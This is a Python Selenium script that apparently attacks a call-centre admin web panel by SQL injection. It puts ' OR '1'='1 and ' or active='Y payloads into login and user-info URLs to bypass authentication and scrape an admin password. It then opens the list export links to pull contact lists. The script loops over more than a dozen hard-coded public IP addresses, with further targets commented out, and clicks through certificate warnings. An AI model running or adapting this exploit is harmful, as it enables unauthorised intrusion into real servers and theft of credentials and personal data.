import time
import re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys  


driver = webdriver.Chrome(r"browsers\chromedriver.exe")
driver.maximize_window()
 

def launch_the_beast  (ip_adress):
    try:
         # ip_adress = 'https://89.234.149.182'
        autehnticate_url = "{0}/go_login/validate_credentials/admin/' OR '1'='1"  .format(    ip_adress)
        get_password_url = "{0}/index.php/go_site/go_get_user_info/' or active='Y"  .format(    ip_adress)
        get_list_url = "{0}/go_list" .format(ip_adress)
    
       
    
        # driver.get("https://89.234.149.182/go_login/validate_credentials/admin/' OR '1'='1")
        driver.get  (autehnticate_url)
        
        button  = driver.find_element_by_id ("details-button").click()
        button  = driver.find_element_by_id ("proceed-link").click()
        # driver.get("https://89.234.149.182/index.php/go_site/go_get_user_info/' or active='Y")
        driver.get  (get_password_url)
         

        text  =  driver.find_element_by_css_selector ( "*").text
        x = re.split("\|", text)
        password =   x[1]


        print('ip_adress', ip_adress)
        print('autehnticate_url', autehnticate_url)
        print('get_password_url', get_password_url)
        print('get_list_url', get_list_url)
        print (password ,"\n" )



        driver.get  (get_list_url)
        

        fichier_links = driver.find_elements_by_css_selector ("#listtableresult > tbody > tr  > td:nth-child(8) > div:nth-child(2) > a")

        for item in fichier_links:
            driver.get (item.get_dom_attribute("href") )
            item.send_keys(Keys.CONTROL + Keys.RETURN)
            time.sleep (10)
            print  (item.get_dom_attribute("href")  ) 

    except Exception:
        pass    



# list =[
#     "https://162.246.248.54",
#     "https://162.246.248.118",
#     "https://207.244.237.160",
#     "https://207.244.237.160",
#     "https://66.165.230.15",
#     "https://162.246.248.118",
#     "https:// 162.246.248.54",
#     "https://185.252.232.53",
#     "https://45.32.74.239",
#     "https://192.227.91.212",
#     "https://192.227.83.180",
#     "https://192.227.83.186",
#     "https://192.227.123.237",
#     "https://192.227.123.233",
#     "https://192.227.123.234",
#     "https://199.231.161.75",
#     "https://185.252.232.53" 
# ]

# {0}/go_list/go_list/lists/2#tabs-1


list =[
    "https://67.213.73.123" , 
    "https://51.222.231.245" , 
    "https://51.222.231.243" , 
    "https://142.44.193.216" , 
    "https://142.44.193.223" , 
    "https://51.222.231.241" , 
    "https://51.222.175.4" , 
    "https://54.39.175.60" , 
    "https://149.56.115.236" , 
    "https://158.69.160.172" , 
    "https://216.105.93.195" , 
    "https://142.44.193.222" , 
    "https://142.44.193.220" , 
]

for item in list: 
    launch_the_beast ( item)